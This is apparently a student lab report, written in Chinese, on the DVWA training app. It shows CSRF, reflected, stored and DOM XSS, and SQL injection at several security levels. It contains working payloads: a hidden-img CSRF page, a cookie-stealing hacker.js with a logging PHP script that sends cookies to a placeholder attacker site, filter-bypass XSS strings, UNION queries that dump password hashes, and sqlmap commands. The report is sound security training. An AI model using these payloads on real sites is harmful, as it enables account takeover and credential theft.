#### 网络工程实训第三次实验

##### 任务一：CSRF攻击

###### 1. Low Level

+ 下载GNONE Web浏览器

```sh
$ sudo apt-get update
$ sudo apt-get install epiphany-browser -y
```

+ 修改DVWA安全等级

![image-20240515163417698](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151634823.png)

+ 进入CSRF首页，修改密码（这里我已经改过了）

![image-20240515163443905](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151634021.png)

可以发现url为：`http://dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#`

显示为get请求，查看其源码：

```php

<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $current_user = dvwaCurrentUser(); 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';"; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
} 

?>
```

可以看到，当我们的**新密码**与**确认密码**输入项相同的时候，请求就会发出，修改服务器中储存的用户信息

而其填充前端的方式则是：`http://dvwa/vulnerabilities/csrf/?password_new=[新密码]&password_conf=[确认密码]&Change=Change#`



1. 短链接攻击：只需要构造上述的url便可以直接修改用户密码，但是上述加载网页方式过于直白，因此生成短链进行映射会让这样的操作变得更像另一域名网站

![image-20240515165152106](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151651192.png)

2. 编辑页面攻击：类似地，我们可以将这个链接直接放在无法直接显示的页面组件上，如`html`中的`<img>`标签

```html
<html>
	<head>
	</head>
	<body>
		<img src="http://dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#" boder="0" style="display:none;"/>
		<h1>Hello World!</h1>
		<h2>Welcome to my HTML page.<h2>
	</body>
</html>
```

+ 由于html在加载元素时会自动访问此链接，因此只要访问该页，就会跳转访问修改密码的链接

![image-20240515170340045](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151703156.png)



###### 2. Medium Level

这一部分在之前基础上增加了`referer`头的检测，请求在处理前判断主机名是否在`referer`头中，后端php代码如下：

```php
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Checks to see where the request came from 
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { 
        // Get input 
        $pass_new  = $_GET[ 'password_new' ]; 
        $pass_conf = $_GET[ 'password_conf' ]; 

        // Do the passwords match? 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
            $pass_new = md5( $pass_new ); 

            // Update the database 
            $current_user = dvwaCurrentUser(); 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';"; 
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Issue with passwords matching 
            echo "<pre>Passwords did not match.</pre>"; 
        } 
    } 
    else { 
        // Didn't come from a trusted source 
        echo "<pre>That request didn't look correct.</pre>"; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
} 

?> 
```

上述php的逻辑大体是，当涉及`change`就需要验证`stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false`，即：需要找到请求头中`HTTP_REFERER`存在`SERVER_NAME`位置。这时我们想伪造请求就不得不去伪造“请求头”，手动填充“referer”内容。

获得请求头可以通过很多方式，如：浏览器的开发者工具和众多抓包工具。这里选择`Burp Suit`，因为其可以简单的伪造一个请求头。

+ 首先设置回环端口代理，监控发包情况：

![image-20240515172931303](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151729435.png)

+ 得到请求头文件：

![image-20240515173336230](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151733331.png)

可以看到`Host`段为`dvwa`（`SERVER_NAME`），之后在`Referer`路径中也有`dvwa`，说明php检测通过

+ 构造请求包：

![image-20240515174354133](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151743236.png)

+ 密码修改成功：

![image-20240515174551285](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151745378.png)



##### 任务二：XSS攻击（反射型）

###### 1. Low Level

```php
<?php 

header ("X-XSS-Protection: 0"); 

// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 

?> 
```

上述代码中将文本框输入的字符串当作`'name'`字段，并且只过滤了`'name'`字段为空的情况，因此随意一个字符串都可以输入到变量中。

但是，php 自使用`echo '[字符串]'`命令是会自动解析运行`js`代码的，因此这也就为注入提供了可乘之机。

我们可以注入以下的代码来详细反馈到页面上：

```javascript
<script>alert("你吃了么？")</script>
```

![image-20240515181655565](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405151816670.png)

但是距离执行到`hack`程度还有段距离，我们想要通过执行当前的命令拿到用户cookie。

在实验题解中，我们会调用`<script src="【黑客网站地址】" /></script>`语句进行访问其页面下某个页面的操作，而此地址刚好是如下目录地址（部署网站文件下）：

![image-20240516162221443](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405161622579.png)

调用上述`js`在该目录下构造一个代码文件`js`，使其能够访问到页面带来的`document.cookie`附加于页面属性上，并且发送给黑客。

```javascript
//hacker.js
var img = new Image();
img.src="【黑客网站】/hacker.php?x=" + document.cookie;	//访问此js就对hacker进行响应
document.body.append(img);
```

与此同时，只要运行一个后端`php`代码就能拿到`cookie`：

```php
//hacker.php
<?php
$cookie = $_GET['x'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>
```

当然上述操作只需要访问链接`http://dvwa/vulnerabilities/xss_r/?name=<script src="【黑客网站】/hacker.js" /></script>`就行（对html页面的输入框输入访问黑客网站脚本）

不过，我并没有找到`php`书写下来的`cookie.txt`，所以开始复盘：

+ 首先查看`js`与`php`脚本是否有问题：

![image-20240516172954248](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405161729456.png)

可以看到，它拿到了`cookie`命令，因此就要检查`php`的保存命令

+ php中的`$fp = fopen("cookie.txt","a");`说明其以追加方式保存`cookie`，那么我尝试自己建立一个`cookie.txt`文件，但是其标识为**可读**，于是我尝试将`gnome-web`使用命令行赋予管理员权限：

```sh
$ root@VM:/usr/bin#  gnome-www-browser 
```

可以运行这一`Web`程序（主要是其对应软件名称和实际进程是不同的名字），因此我就尝试从资源监视器【`System Monitor`】中寻找它：

![image-20240516174255845](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405161742959.png)

之后就可以看到`browser`条目，判断为浏览器

+ 但是尝试之后发现仍然不行，我认为是权限问题，于是输入以下命令改变可写权限：

```sh
# 改变其目录及子目录以下权限为任何人均可读、写、可执行
$ root@VM:/var/www/html/DVWA-master/vulnerabilities/xss_r# chmod -R 777 *
```

之后我认为是`php`脚本没有办法对`cookie.txt`执行“写”操作导致了这一次操作失败。

+ 那么可以看到`cookie`内容如下所示：

![image-20240516174722894](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405161747989.png)



###### 2. Medium Level

首先看下其对应的`php`后端如何操作：

```php
<?php 

header ("X-XSS-Protection: 0"); 

// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 

    // Feedback for end user 
    echo "<pre>Hello {$name}</pre>"; 
} 

?> 
```

可以看到上述代码主要针对几个方面做出要求：

1. `name`字段不为空
2. 对`<script>`标签进行替换空值操作

但是，值得注意的是`php`执行`script`脚本时本身是不区分大小写进行解析的，所以可以接着尝试上述方式：`<sCript src="http://dvwa/vulnerabilities/xss_r/hacker.js" /></sCript>`

![image-20240516213049572](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405162130678.png)



###### 3. High Level

```php
<?php 

header ("X-XSS-Protection: 0"); 

// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 

    // Feedback for end user 
    echo "<pre>Hello {$name}</pre>"; 
} 

?> 
```

高等级下，为了防止上述的大小写等执行`javascript`标签攻击，因此将满足正则式`/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i`（即：`<*s*c*r*i*p*t`，其中的`/i`为不区分大小写标记），但是实际上调用外部链接还可以使用除了`<script>`标签以外的`<img src = 1 onerror = 【执行命令】>`执行标签进行跳转执行。

尝试命令：`<img src = 1 onerror = alert(document.cookie)>`

但是，我还想要直接执行`./hacker.js`脚本，但是暂时还没找到直接复用上述代码简单的注入方式

可参考的：[什么是基于 DOM 的跨站点脚本？ - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/611042107)



##### 任务二：XSS攻击（存储型）

###### 1. Low Level

```php
<?php 

if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 

    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 

    // Sanitize name input 
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 

    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close(); 
} 

?> 
```

此段代码主要负责与后端数据库的交互，骇入者主要关心写入数据库的相关内容，可以发现存储内容来源于以下的这条语句：

```php
$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
```

而这里对`$message`和`$name`是没有进行相关`javascript`检查的，因此可以注入一段`js`脚本进去（仍然可以尝试之前的自动化处理，不过每次跳转页面都会触发，因此意义不是很大），注入脚本`<script>alert(document.cookie)</script>`

![image-20240516222930201](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405162229330.png)



###### 2. Medium Level

```php
<?php 

if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 

    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
    $message = htmlspecialchars( $message ); 

    // Sanitize name input 
    $name = str_replace( '<script>', '', $name ); 
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 

    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close(); 
} 

?> 
```

观察源码，`message`经过`stripslashed`函数去除反斜杠,`mysqli_real_escape_string()`对可能引起SQL注入的字符进行转义。最后通过`hmlspecialchars()`函数将`message`中的特殊字符进行转义，以保证在HTML页面中显示用户输入的文本，阻止了XSS攻击。

`name`字段则简单通过`str_replace()`函数对`scirpt`头进行替换，但是大小写不通用，所以仍然可以使用`<Script>alert(1)</Script>`蒙混过关。故可对`name`字段进行xss注入。

但是html限制了输入框长度，因此可以尝试修改静态网页：

![image-20240516224030744](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405162240890.png)

![image-20240516224135055](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405162241173.png)

比较神奇的是：双写绕过`<scr<script>ipt>alert(1)</script>`



###### 3. High Level

```php
<?php 

if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 

    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 
    $message = htmlspecialchars( $message ); 

    // Sanitize name input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); 
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); 

    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close(); 
} 

?> 
```

与之前反射型`high`类似的，`name`使用`/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i`进行正则封锁，但是可以使用`<img src = 1 onerror = alert(document.cookie)>`。

![image-20240517102344652](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171023819.png)

在`name`处输入字符串，就可以植入此`js`脚本。



##### 任务二：XSS攻击（DOM型）

###### 1. Low Level

```php
<?php 

# No protections, anything goes 

?> 
```

可以看到，php没有进行任何代码运行

因此，尝试前端部分直接获取信息：

```html
<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}
					    
					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
</script>
```

发现了上述的`js`部分，看到其对`default=`字段是否开始于`>=0`的判断条件，可以对静态网页进行操作，也就是说只需要内容变为`default=<script>alert(document.cookie)</script>`就可以完成注入。而且，当设置下拉框时`url`就会变成`http://dvwa/vulnerabilities/xss_d/?default=Spanish`，所以将`url`修改为：`http://dvwa/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>`

![image-20240517123221754](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171232918.png)



###### 2. Medium Level

```php
<?php 

// Is there any input? 
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) { 
    $default = $_GET['default']; 
     
    # Do not allow script tags 
    if (stripos ($default, "<script") !== false) { 
        header ("location: ?default=English"); 
        exit; 
    } 
} 

?> 
```

使用`stripos ($default, "<script") !== false`进行匹配`<script`标签进行替换，同样尝试`img`标签注入：`English</option></select><img src = 1 onerror = alert(document.cookie)>`

![image-20240517112833985](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171128125.png)

发现`<img>`注入成功

![image-20240517123324009](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171233096.png)



###### 3. High Level

```php
<?php 

// Is there any input? 
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) { 

    # White list the allowable languages 
    switch ($_GET['default']) { 
        case "French": 
        case "English": 
        case "German": 
        case "Spanish": 
            # ok 
            break; 
        default: 
            header ("location: ?default=English"); 
            exit; 
    } 
} 

?> 
```

在上述内容中发现，`default`内容除去设定外并不能直接访问其它自定义的`js`相关代码，因此想直接绕过基本不可能。但是，仍然是有办法，在注入的 payload 中加入注释符 “#”，注释后边的内容不会发送到服务端，但是会被前端代码所执行。

注入：`English #<script>alert(document.cookie)</script>`

![image-20240517123448664](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171234755.png)



##### 任务三：SQL注入攻击

###### 1. Low Level

```php
<?php 

if( isset( $_REQUEST[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_REQUEST[ 'id' ]; 

    switch ($_DVWA['SQLI_DB']) { 
        case MYSQL: 
            // Check database 
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Get results 
            while( $row = mysqli_fetch_assoc( $result ) ) { 
                // Get values 
                $first = $row["first_name"]; 
                $last  = $row["last_name"]; 

                // Feedback for end user 
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
            } 

            mysqli_close($GLOBALS["___mysqli_ston"]); 
            break; 
        case SQLITE: 
            global $sqlite_db_connection; 

            #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']); 
            #$sqlite_db_connection->enableExceptions(true); 

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
            #print $query; 
            try { 
                $results = $sqlite_db_connection->query($query); 
            } catch (Exception $e) { 
                echo 'Caught exception: ' . $e->getMessage(); 
                exit(); 
            } 

            if ($results) { 
                while ($row = $results->fetchArray()) { 
                    // Get values 
                    $first = $row["first_name"]; 
                    $last  = $row["last_name"]; 

                    // Feedback for end user 
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
                } 
            } else { 
                echo "Error in fetch ".$sqlite_db->lastErrorMsg(); 
            } 
            break; 
    }  
} 

?> 
```

观察源码,源码对输入的 `id `完全信任，没有做任何过滤。观察到接收的 `id `的左右内容将会被直接放入一个 SQL 查询语句，使用 `mysqli_query `函数用该语句对某个数据库进行查询。`mysqli_fetch_assoc()`函数从结果集中取得一行作为关联数组，然后将查询到的数据输出。

攻击：判断注入类型，确定服务器将id的值认为是字符型还是数字，这里使用`1’ or ‘1’ = ‘1`进行判断。其中逻辑如下，若传回的为字符型（单引号闭合）`'1' or '1' = '1'`，则表达式为真；若传回为数字型，表达式为`1' or '1' = '1`，则可能报错（或只是返回同一结果）；若其为字符型（双引号闭合）`"1' or '1' = '1"`，则表达式布尔值仍然为真。这里注入的字段为数字型

之后，查找字段数，使用SQL语言的ORDER语句进行测试：`' or 1 = 1 order by 【字段数】 #'`

首先必然会有一个字段，之后测试2字段和3字段:

+ 2字段进行排序：

![image-20240517145449028](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171454150.png)

+ 3字段进行排序：

![image-20240517145338063](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171453215.png)

+ 查询数据库名称：`1' UNION SELECT 1,database() from information_schema.schemata#`

![image-20240517151950078](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171519159.png)

+ 获取dvwa数据库中的表名：`1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'#`

![image-20240517152314474](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171523604.png)

+ 获取user表下列名：`1' UNION SELECT 1,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#`

![image-20240517153910804](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171539952.png)

+ 获取user表下各用户密码：`1' UNION SELECT 1,group_concat(user,0x3a,password) from users#`

![image-20240517153945228](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171539340.png)

`admin`密码：`5f4dcc3b5aa765d61d8327deb882cf99`

![image-20240517154317322](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171543423.png)



##### 任务四：数据库（盲注）

###### 1. Low Level

```php
<?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_GET[ 'id' ]; 
    $exists = false; 

    switch ($_DVWA['SQLI_DB']) { 
        case MYSQL: 
            // Check database 
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
            try { 
                $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors
            } catch (Exception $e) { 
                print "There was an error."; 
                exit; 
            } 

            $exists = false; 
            if ($result !== false) { 
                try { 
                    $exists = (mysqli_num_rows( $result ) > 0); 
                } catch(Exception $e) { 
                    $exists = false; 
                } 
            } 
            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
            break; 
        case SQLITE: 
            global $sqlite_db_connection; 

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
            try { 
                $results = $sqlite_db_connection->query($query); 
                $row = $results->fetchArray(); 
                $exists = $row !== false; 
            } catch(Exception $e) { 
                $exists = false; 
            } 

            break; 
    } 

    if ($exists) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } else { 
        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

} 

?> 
```

直接将ID参数插入查询语句执行SQL查询操作。查询结束后只返回该查询ID在数据库中是否存在。



+ 安装`sqlmap`：

这里我使用`zip`进行安装（`git`不大行），所以就直接输入`http:////github.com/sqlmapproject/`进行下载，`unzip`解压，`mv`命令重命名

```sh
$ root@VM:/opt# unzip sqlmap-master.zip
$ root@VM:/opt# mv sqlmap-master sqlmap
$ root@VM:/opt# cd sqlmap/
$ root@VM:/opt/sqlmap# ./sqlmap.py -h
```

![image-20240517160637292](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171606432.png)

之后配置`python2`环境：

```sh
$ sudo apt-get update
$ apt install python2
$ sudo apt-get update
$ pip install --upgrade pip
$ python2 sqlmap.py -hh
```

安装完成后，就运行`python`运行程序：

![image-20240517160956094](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171609209.png)

使用`BurpSuit`进行`cookie`抓取：`cookie: PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low`



+ 开始盲注：

执行命令：`python2 sqlmap.py -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low" --batch`得到结果：

```sh
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7506=7506 AND 'ATYf'='ATYf&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9549 FROM (SELECT(SLEEP(5)))jhWv) AND 'mFEe'='mFEe&Submit=Submit
---
```

可执行：`python2 sqlmap.py -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low" --batch --technique=B --current-db`得到当前数据库名称：

![image-20240517165212488](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171652617.png)

查询数据库下的表：`python2 sqlmap.py -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low" --batch --technique=B --current-db -D dvwa --tables`

![image-20240517170432334](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171704456.png)

查询`users`表下字段：`python2 sqlmap.py -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low" --batch --technique=B --current-db -D dvwa --tables -T users --columns`

![image-20240517170614309](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171706403.png)

查询`user`中各用户密码：`python2 sqlmap.py -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=pbhpblqt95rv4ghv88dmeljh7c; security=low" --batch --technique=B --current-db -D dvwa --tables -T users -C user,password --dump`

![image-20240517170912454](https://cdn.jsdelivr.net/gh/Ken-ky/blogImage@main/img/202405171709564.png)
